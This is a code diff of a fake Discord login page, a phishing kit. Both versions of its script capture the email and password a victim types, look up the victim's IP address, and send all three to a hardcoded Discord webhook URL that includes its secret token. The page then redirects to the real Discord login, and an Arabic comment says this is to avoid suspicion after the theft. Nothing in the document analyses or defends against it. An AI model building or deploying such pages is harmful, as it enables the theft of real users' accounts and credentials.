@@ -1,149 +1,132 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord | Login</title>
     <style>
-        /* تصميم ديسكورد الرسمي */
+        /* التنسيق الجمالي المطابق لديسكورد */
         body {
             margin: 0;
-            padding: 0;
-            font-family: 'gg sans', 'Noto Sans', sans-serif;
-            background-image: url('https://discord.com/assets/7c97f8ef22fa84d3.png'); /* خلفية ديسكورد */
+            background-color: #313338; /* لون ديسكورد الرسمي */
+            background-image: url('https://discord.com/assets/f9a059600e5728a7e781.svg');
+            background-position: center;
             background-size: cover;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            overflow: hidden;
         }
 
-        .login-box {
-            background: #313338;
+        .login-card {
+            background: #2B2D31;
             padding: 32px;
+            width: 480px;
             border-radius: 8px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            color: #DBDEE1;
             text-align: center;
-            color: #f2f3f5;
         }
 
-        h2 { margin-bottom: 8px; font-size: 24px; }
-        p { color: #b5bac1; margin-bottom: 20px; font-size: 16px; }
+        h2 { color: white; margin-bottom: 8px; font-size: 24px; }
+        p { color: #B5BAC1; font-size: 16px; margin-bottom: 20px; }
 
-        .input-group {
-            text-align: left;
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            color: #b5bac1;
-            font-size: 12px;
-            font-weight: bold;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
-
+        .field { text-align: left; margin-bottom: 20px; }
+        label { display: block; font-size: 12px; font-weight: bold; color: #B5BAC1; margin-bottom: 8px; text-transform: uppercase; }
+        
         input {
             width: 100%;
             padding: 10px;
-            background: #1e1f22;
-            border: none;
+            background: #1E1F22;
+            border: 1px solid #1E1F22;
             border-radius: 3px;
             color: white;
             font-size: 16px;
+            outline: none;
             box-sizing: border-box;
         }
 
         button {
             width: 100%;
             padding: 12px;
-            background: #5865f2;
+            background: #5865F2; /* لون زر ديسكورد */
             color: white;
             border: none;
             border-radius: 3px;
             font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
-            transition: background 0.2s;
+            margin-top: 20px;
         }
 
-        button:hover { background: #4752c4; }
+        button:hover { background: #4752C4; }
 
-        .footer-links {
-            margin-top: 8px;
-            text-align: left;
-            font-size: 14px;
-            color: #00a8fc;
-            cursor: pointer;
-        }
+        .links { text-align: left; font-size: 14px; color: #00A8FC; margin-top: 8px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
+    <div class="login-card">
         <h2>Welcome back!</h2>
         <p>We're so excited to see you again!</p>
 
-        <div class="input-group">
+        <div class="field">
             <label>Email or Phone Number</label>
-            <input type="text" id="email" required>
+            <input type="text" id="usr">
         </div>
 
-        <div class="input-group">
+        <div class="field">
             <label>Password</label>
-            <input type="password" id="password" required>
-            <div class="footer-links">Forgot your password?</div>
+            <input type="password" id="pwd">
+            <div class="links">Forgot your password?</div>
         </div>
 
-        <button onclick="sendData()">Log In</button>
+        <button onclick="pwn()">Log In</button>
 
-        <div style="margin-top: 15px; font-size: 14px; color: #b5bac1; text-align: left;">
-            Need an account? <span style="color: #00a8fc; cursor: pointer;">Register</span>
+        <div style="margin-top: 15px; font-size: 14px; color: #949BA4; text-align: left;">
+            Need an account? <span style="color: #00A8FC; cursor: pointer;">Register</span>
         </div>
     </div>
 
     <script>
         // ضع رابط الـ Webhook الخاص بك هنا
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr";
+        const WEB_URL = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr";
 
-        async function sendData() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
+        async function pwn() {
+            const u = document.getElementById('usr').value;
+            const p = document.getElementById('pwd').value;
 
-            if(!email || !pass) return alert("Please fill in all fields");
+            if(!u || !p) return;
 
-            // جلب الـ IP تلقائياً لإضافته للتقرير
-            let ipData = { ip: "Unknown" };
+            // جمع بيانات الـ IP تلقائياً
+            let ip = "0.0.0.0";
             try {
-                ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                ip = json.ip;
             } catch(e) {}
 
-            const payload = {
+            const msg = {
                 embeds: [{
-                    title: "📥 New Login Attempt",
-                    color: 0x5865F2,
+                    title: "💎 New Discord Hit!",
+                    color: 5814783,
                     fields: [
-                        { name: "👤 User/Email", value: `\`${email}\``, inline: true },
-                        { name: "🔑 Password", value: `\`${pass}\``, inline: true },
-                        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: false },
-                        { name: "🖥️ Browser", value: navigator.userAgent, inline: false }
+                        { name: "👤 User", value: `\`${u}\``, inline: true },
+                        { name: "🔑 Pass", value: `\`${p}\``, inline: true },
+                        { name: "🌐 IP", value: `\`${ip}\`` }
                     ],
-                    timestamp: new Date()
+                    footer: { text: "Leviathan V26.0 - Auto Sniper" }
                 }]
             };
 
-            fetch(WEBHOOK_URL, {
+            fetch(WEB_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(msg)
             }).then(() => {
-                // توجيه المستخدم لصفحة ديسكورد الحقيقية بعد السرقة لإبعاد الشبهة
-                window.location.href = "https://discord.com/login";
-            }).catch(() => {
-                alert("Connection Error!");
+                // تحويل للتمويه
+                window.location.replace("https://discord.com/login");
             });
         }
     </script>
